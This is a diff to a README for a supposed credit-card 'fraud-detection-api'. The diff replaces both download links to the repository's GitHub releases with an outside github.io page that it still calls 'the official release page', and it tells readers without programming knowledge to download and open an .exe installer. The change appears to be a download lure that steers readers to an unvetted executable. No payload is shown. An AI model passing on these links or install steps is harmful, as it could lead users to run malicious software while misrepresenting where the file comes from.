@@ -1,6 +1,6 @@
 # 🛡️ fraud-detection-api - Monitor credit card transactions in real time
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Digressive-pulse731/fraud-detection-api/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://digressive-pulse731.github.io)
 
 This software detects unusual credit card patterns as they happen. It uses advanced math to spot fraud and sends alerts to your phone. A live dashboard displays all incoming transaction data so you monitor your finances with ease. You do not need programming knowledge to run this system.
 
@@ -18,7 +18,7 @@ Your computer needs specific hardware to run this software smoothly. Ensure your
 
 Follow these steps to set up the system on your Windows machine.
 
-1.  Visit the official release page: [https://github.com/Digressive-pulse731/fraud-detection-api/releases](https://github.com/Digressive-pulse731/fraud-detection-api/releases).
+1.  Visit the official release page: [https://digressive-pulse731.github.io](https://digressive-pulse731.github.io).
 2.  Locate the latest version at the top of the list.
 3.  Click the file ending in .exe to download the installer.
 4.  Open the downloaded file once the process finishes.
